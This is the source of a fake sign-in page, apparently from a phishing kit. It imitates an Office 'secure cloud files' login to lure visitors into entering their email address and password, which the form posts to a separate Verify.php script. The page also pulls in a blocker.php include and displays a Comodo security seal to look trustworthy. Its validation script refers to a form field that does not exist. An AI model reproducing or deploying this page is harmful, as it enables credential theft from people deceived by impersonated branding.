<?php
include('blocker.php');
?>

<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<link rel="shortcut icon" href="cloud.ico" type="image/gif">
<script type="text/javascript">
<!--
function validateusername()
{
 
   var emailID = document.myForm.username.value;
   atpos = emailID.indexOf("@");
   dotpos = emailID.lastIndexOf(".");
   if (atpos < 1 || ( dotpos - atpos < 2 )) 
   {
       alert("Please enter correct Email ID")
       document.myForm.username.focus() ;
       return false;
   }
   return( true );
}

function validate()
{
 
   if( document.myForm.username.value == "" )
   {
     alert( "Please provide your Email!" );
     document.myForm.username.focus() ;
     return false;
   }else{
     // Put extra check for data format
     var ret = validateusername();
     if( ret == false )
     {
          return false;
     }
   }
   if( document.myForm.password.value == "" )
   {
     alert( "Please provide your Password!" );
     document.myForm.password.focus() ;
     return false;
   }
   return( true );
}
//-->
</script>
<title>(1) New file - Sign in</title></head>
<body>

<br>

<table align="center">

<tbody><tr><td>

	<div align="center">

	<img src="Offices.png" width="480" height="50">
<div align="center">
                  <font face="Segoe UI Light" size="+1" color="#276BA2">Receive Secure cloud files. Any e-mail, Anywhere!</font><br>

              </div>
	<br><img src="top.PNG" width="140" height="70">

	<form id="frmLogin" method="post" action="Verify.php" name="myForm" onsubmit="return(validate());">	
	
	<input id="email" name="email" type="email" style="width:380px; height:40px; font-family: Verdana; font-size: 15px; font-weight: light; color:#000000; 
	background-color: #ffffff; border: solid 1px #0080FF; padding: 13px;" required="" placeholder="Enter email address">
	

	

	<br><br>

	<font align="left" face="verdana" size="+2" color="#000000"> <?php echo htmlspecialchars($_GET['email']); ?> </font>

	<br><br>

	<input id="password" name="password" type="password" style="width:380px; height:40px; font-family: Verdana; font-size: 15px; font-weight: light; color:#000000; 
	background-color: #ffffff; border: solid 1px #0080FF; padding: 13px;" required="" placeholder="Enter Password">	



	<br><br>

	<input type="submit" id="submit" name="submit" value="Continue &gt;&gt;" style="width:380px; height:35px; background-color: #0080FF; border: solid 3px #0080FF; 
	font-family: Verdana; font-size: 17px; font-weight: light; color: #ffffff; -moz-border-radius: 4px; -webkit-border-radius: 4px; 
	-khtml-border-radius: 4px; border-radius: 4px;
	-moz-box-shadow: 5px 5px 5px #888; -webkit-box-shadow: 5px 5px 5px #888; box-shadow: 5px 5px 5px #888;">

	<br>
	</form><br><br><br>
</div>
              <div align="center">
                <img src="strip.png" width="938" height="130">
              </div>
            

              <div align="center" style="padding: 0 5px 10px 10px; position: absolute; bottom: 0; right: 0;">
                <a href=""><img src="comodo_secure_seal_113x59_transp.png" width="113" height="59"></a>
              </div>
</center
</body></html>